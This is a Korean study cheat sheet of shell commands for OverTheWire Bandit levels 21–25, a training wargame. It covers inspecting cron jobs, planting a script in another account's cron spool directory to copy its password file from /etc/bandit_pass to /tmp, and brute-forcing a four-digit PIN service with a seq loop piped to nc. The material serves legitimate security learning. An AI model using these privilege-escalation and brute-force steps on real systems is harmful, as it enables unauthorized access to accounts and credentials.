# Bandit Level 21 ~ 24 핵심 명령어 정리

| 단계             | 핵심 명령어                                                                                                | 핵심 내용                             |
| -------------- | ----------------------------------------------------------------------------------------------------- | --------------------------------- |
| Bandit 21 → 22 | `ls -l /etc/cron.d/`                                                                                  | 시스템에 등록된 cron 작업 확인               |
| Bandit 21 → 22 | `cat /etc/cron.d/cronjob_bandit22`                                                                    | bandit22 계정의 cron 설정 확인           |
| Bandit 21 → 22 | `cat /usr/bin/cronjob_bandit22.sh`                                                                    | cron에서 실행되는 쉘 스크립트 내용 확인          |
| Bandit 21 → 22 | `cat /tmp/<스크립트에_지정된_파일명>`                                                                            | cron 스크립트가 저장한 bandit22 비밀번호 확인   |
| Bandit 22 → 23 | `cat /etc/cron.d/cronjob_bandit23`                                                                    | bandit23 계정의 cron 설정 확인           |
| Bandit 22 → 23 | `cat /usr/bin/cronjob_bandit23.sh`                                                                    | cron 스크립트의 파일명 생성 방식 분석           |
| Bandit 22 → 23 | `myname=bandit23`                                                                                     | 스크립트에서 사용할 대상 사용자 설정              |
| Bandit 22 → 23 | `echo "I am user $myname" \| md5sum \| cut -d ' ' -f 1`                                               | bandit23 비밀번호가 저장되는 `/tmp` 파일명 계산 |
| Bandit 22 → 23 | `cat /tmp/$(echo "I am user bandit23" \| md5sum \| cut -d ' ' -f 1)`                                  | 계산한 파일에서 bandit23 비밀번호 확인         |
| Bandit 23 → 24 | `cat /etc/cron.d/cronjob_bandit24`                                                                    | bandit24 계정의 cron 설정 확인           |
| Bandit 23 → 24 | `cat /usr/bin/cronjob_bandit24.sh`                                                                    | cron이 실행하는 스크립트와 실행 경로 확인         |
| Bandit 23 → 24 | `cd /tmp`                                                                                             | 임시 작업 디렉터리로 이동                    |
| Bandit 23 → 24 | `mkdir bandit23_work`                                                                                 | 작업용 디렉터리 생성                       |
| Bandit 23 → 24 | `cd bandit23_work`                                                                                    | 생성한 작업 디렉터리로 이동                   |
| Bandit 23 → 24 | `nano getpass.sh`                                                                                     | bandit24 비밀번호를 복사할 스크립트 작성        |
| Bandit 23 → 24 | `#!/bin/bash`                                                                                         | Bash 스크립트 실행 선언                   |
| Bandit 23 → 24 | `cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password`                                              | bandit24 비밀번호를 `/tmp` 파일로 복사      |
| Bandit 23 → 24 | `chmod 644 /tmp/bandit24_password`                                                                    | 복사된 비밀번호 파일을 읽을 수 있도록 권한 설정       |
| Bandit 23 → 24 | `chmod +x getpass.sh`                                                                                 | 작성한 스크립트에 실행 권한 부여                |
| Bandit 23 → 24 | `cp getpass.sh /var/spool/bandit24/foo/`                                                              | cron이 실행하는 디렉터리에 스크립트 복사          |
| Bandit 23 → 24 | `cat /tmp/bandit24_password`                                                                          | cron 실행 후 생성된 bandit24 비밀번호 확인    |
| Bandit 24 → 25 | `nc localhost 30002`                                                                                  | 로컬 30002 포트의 PIN 인증 서비스 접속        |
| Bandit 24 → 25 | `PASS=$(cat /etc/bandit_pass/bandit24)`                                                               | 현재 bandit24 비밀번호를 변수에 저장          |
| Bandit 24 → 25 | `seq -w 0000 9999`                                                                                    | `0000`부터 `9999`까지 4자리 PIN 생성      |
| Bandit 24 → 25 | `for pin in $(seq -w 0000 9999); do echo "$PASS $pin"; done`                                          | 비밀번호와 모든 PIN 조합 생성                |
| Bandit 24 → 25 | `for pin in $(seq -w 0000 9999); do echo "$PASS $pin"; done \| nc localhost 30002`                    | 생성한 모든 PIN 조합을 서버에 전송             |
| Bandit 24 → 25 | `for pin in $(seq -w 0000 9999); do echo "$PASS $pin"; done \| nc localhost 30002 \| grep -v "Wrong"` | 실패 메시지를 제외하고 성공 결과만 출력            |

## Bandit 23 → 24 스크립트 예시

| 구분          | 명령어                                                      |
| ----------- | -------------------------------------------------------- |
| 스크립트 생성     | `nano getpass.sh`                                        |
| 실행 환경 지정    | `#!/bin/bash`                                            |
| 비밀번호 복사     | `cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password` |
| 읽기 권한 설정    | `chmod 644 /tmp/bandit24_password`                       |
| 실행 권한 부여    | `chmod +x getpass.sh`                                    |
| cron 경로로 복사 | `cp getpass.sh /var/spool/bandit24/foo/`                 |
| 결과 확인       | `cat /tmp/bandit24_password`                             |
